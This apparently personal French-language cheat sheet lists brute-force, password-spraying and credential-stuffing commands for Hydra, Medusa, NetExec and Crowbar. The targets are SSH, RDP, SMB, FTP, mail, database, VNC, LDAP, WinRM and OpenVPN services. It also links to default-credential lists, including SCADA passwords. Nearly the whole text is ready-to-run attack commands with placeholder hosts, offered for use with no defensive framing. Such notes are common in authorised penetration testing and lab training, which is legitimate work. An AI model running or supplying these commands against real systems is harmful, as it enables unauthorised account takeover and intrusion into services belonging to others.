
[[Wordlists & Rules]]

Wordlistes intéressantes:

/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Password/darkweb2017-top100.txt
/usr/share/seclists/...



# #HYDRA

option -f pour stop quand password trouvé

### HTTP POST REQUEST

```bash
hydra -L <wordlist user> -P <wordlist pass> <IP> -s <port> <http-post-form> <"/login.php:user=^USER^&pass=^PASS^:F=Mot de passe incorrect"> -f -I -V
```

### FTP

```bash
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100 -f -I -V -t 64
```

### SSH

```bash
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100 -f -I -V -t 64
```

**Liste de targets:**

```bash
hydra -l root -p toor -M targets.txt ssh
```
### SMTP

```bash
hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com -f -I -V -t 64
```

### POP3

```bash
hydra -L users.list -P pws.list pop3://10.129.63.80 -f -I -V -t 64
```

### IMAP

```bash
hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com -f -I -V -t 64
```

### MYSQL

```bash
hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100 -f -I -V -t 64
```

### MSSQL

```bash
hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100 -f -I -V -t 64
```

creds stuffing -> https://raw.githubusercontent.com/gauravnarwani97/MsSQL-default-credentials/refs/heads/master/default_db_credentials1.txt

```bash
hydra -C default_db_credentials1.txt mssql://192.168.1.100 -f -I -V -t 64
```

### VNC

```bash
hydra -P /path/to/password_list.txt vnc://192.168.1.100 -f -I -V -t 64
```

### RDP

```bash
hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100 -f -I -V -t 64
```

Générer une wordlist de 6 à 8 caractères à la volée

```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp -f -I -V -t 64
```

### SMB

```shell
hydra -L user.list -P password.list smb://10.129.42.197 -f -I -V -t 64
```


### Credential Stuffing (Liste de default creds)

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main
https://portforward.com/router-password/


```shell
hydra -C <user_pass.list> <protocol>://<IP>
```



# #MEDUSA


### SVN (Version Control System)

```BASH
medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt -e ns
```

### Telnet

```bash
medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt -e ns
```

### HTTP POST REQUEST

```bash
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid" -e ns
```

### HTTP GET

```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

### FTP

```bash
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt -e ns
```

### SSH

```bash
medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt -e ns
```

**Liste de targets:**

```bash
medusa -u root -p toor -H targets.txt ssh -e ns
```
### POP3

```bash
medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt -e ns
```

### IMAP

```bash
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt -e ns
```

### MYSQL

```bash
medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt -e ns
```

### VNC

```bash
medusa -M vnc -h 192.168.1.100 -P passwords.txt -e ns
```


---

# #NETEXEC


### SMB #NXC

#### Bruteforce RID

```bash
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

#### Password spraying

Domaine

```bash
nxc smb 192.168.1.0/24 -u UserNAme -P passwords.txt --continue-on-success | grep +
```

Local

```bash
nxc smb 192.168.1.0/24 -u UserNAme -P passwords.txt --local-auth --continue-on-success | grep +
```

### LDAP

sans Kerberos

```bash
nxc ldap 192.168.1.0/24 -u users.txt -p '' --continue-on-success | grep +
```

avec Kerberos

```bash
nxc ldap 192.168.1.0/24 -u users.txt -p '' -k --continue-on-success | grep +
```

### WINRM

```BASH
nxc winrm 192.168.1.0/24 -u user -p password --continue-on-success | grep +
```

si smb port fermé

```bash
nxc winrm 192.168.1.0/24 -u user -p password -d DOMAIN --continue-on-success | grep +
```

### MSSQL

```BASH
nxc mssql 192.168.1.0/24 -u user -p password --continue-on-success | grep +
```

### SSH

```BASH
nxc ssh 192.168.1.0/24 -u user -p password --continue-on-success | grep +
```

### FTP

```BASH
nxc ftp 192.168.1.0/24 -u user -p password --continue-on-success | grep +
```

### RDP

```BASH
nxc rdp 192.168.1.0/24 -u user -p password --continue-on-success | grep +
```


---


# #CROWBAR

https://github.com/galkan/crowbar

```bash
sudo apt install -y crowbar
```


### RDP

```shell
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### OPENVPN

```shell
crowbar -b openvpn -m configfile -s 192.168.220.142/32 -U users.txt -c 'password123'
```

